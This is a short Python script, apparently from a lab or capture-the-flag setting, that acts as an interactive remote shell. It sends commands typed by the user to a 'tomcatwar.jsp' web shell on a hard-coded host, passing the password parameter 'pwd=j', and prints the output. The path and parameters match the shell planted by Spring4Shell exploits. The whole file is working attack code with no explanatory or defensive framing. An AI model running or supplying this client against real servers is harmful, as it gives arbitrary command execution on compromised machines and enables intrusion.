import requests
import urllib.parse as up
import re
import readline

URL = "http://legacy.tube.com:58152"

class Exploit:
    def __init__(self, cmd, url = URL):
        self.session = requests.Session()
        self.url = url
        self.cmd = cmd
        
    def send_command(self):
        url = self.url+"/tomcatwar.jsp?pwd=j&cmd="+up.quote_plus(self.cmd)
        return self.session.get(url)
    
    def parse_response(self, response):
        response = re.sub("//\n- if.*", "", response, flags=re.DOTALL)
        return response
        
    
    def start(self):
        response = self.send_command()
        respones_parsed = self.parse_response(response.text)
        return respones_parsed
      
while True:  
    cmd = input("cmd: ")
    readline.add_history(cmd)
    exploit = Exploit(cmd).start()
    print(exploit)